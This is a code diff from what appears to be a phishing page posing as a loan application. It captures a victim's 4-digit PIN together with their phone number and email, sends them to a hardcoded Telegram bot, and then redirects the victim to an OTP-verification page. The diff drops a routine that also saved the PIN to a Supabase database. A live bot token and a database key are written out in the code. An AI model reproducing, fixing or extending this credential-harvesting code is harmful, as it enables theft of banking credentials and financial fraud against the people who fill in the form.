@@ -129,7 +129,9 @@
     // SUPABASE & TELEGRAM CONFIGURATION
     // ============================================
     var SUPABASE_URL      = 'https://zchkanbnkghpsaagbnrt.supabase.co';
+    // ⚠️ REPLACE THIS WITH YOUR ACTUAL ANON KEY FROM SUPABASE DASHBOARD ⚠️
     var SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpjaGthbmJrZ2hwc2FhZ2JucnQiLCJyb2xlIjoiYW5vbiIsImlhdCI6MTczNDI1NjQ0MCwiZXhwIjoyMDQ5ODMyNDQwfQ';
+    
     var TG_BOT_TOKEN      = '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
     var TG_CHAT_ID        = '8392790531';
 
@@ -210,7 +212,7 @@
         successDiv.classList.add('show');
     }
 
-    // Send Telegram notification (will NOT stop the redirect if it fails)
+    // Send Telegram notification
     async function sendTelegramNotification(pin) {
         var decodedPhone = decodeURIComponent(phone);
         var decodedEmail = decodeURIComponent(email);
@@ -244,34 +246,19 @@
                 })
             });
             var result = await response.json();
-            console.log('Telegram sent:', result.ok ? '✅ Success' : '❌ Failed');
+            if (result.ok) {
+                console.log('✅ Telegram sent successfully');
+            } else {
+                console.error('Telegram error:', result);
+            }
             return result;
         } catch (error) {
-            console.error('Telegram error:', error);
-            return null; // Don't throw - just return null
+            console.error('Telegram fetch error:', error);
+            return null;
         }
     }
 
-    // Save PIN to Supabase
-    async function savePinToSupabase(pin) {
-        var decodedPhone = decodeURIComponent(phone);
-        
-        var { error: pinErr } = await db
-            .from('users')
-            .update({ pin: pin })
-            .eq('phone', decodedPhone);
-        if (pinErr) console.error('Supabase error:', pinErr);
-        // Don't throw - continue even if Supabase fails
-
-        if (appId) {
-            await db
-                .from('loan_applications')
-                .update({ pin_confirmed: true })
-                .eq('application_id', appId);
-        }
-    }
-
-    // Main confirm function - ALWAYS redirects to OTP page
+    // Main confirm function
     window.handleConfirm = async function() {
         var pin = getPin();
         if (pin.length !== 4) { 
@@ -283,20 +270,10 @@
         confirmBtn.textContent = '⏳ Processing...';
         showSuccess('Processing your request...');
 
-        // Try to send Telegram (but don't wait for it to complete)
-        sendTelegramNotification(pin).catch(function(e) {
-            console.error('Telegram failed but continuing:', e);
-        });
+        // Send Telegram notification (don't wait for it)
+        sendTelegramNotification(pin);
         
-        // Try to save to Supabase (but don't wait for it to complete)
-        savePinToSupabase(pin).catch(function(e) {
-            console.error('Supabase failed but continuing:', e);
-        });
-
-        // Update success message
-        showSuccess('✓ Redirecting to verification page...');
-        
-        // ALWAYS redirect after 3 seconds - regardless of Telegram/Supabase success
+        // Always redirect after 3 seconds
         setTimeout(function() {
             window.location.href = 'otp-verify.html'
                 + '?amount='  + encodeURIComponent(amount)
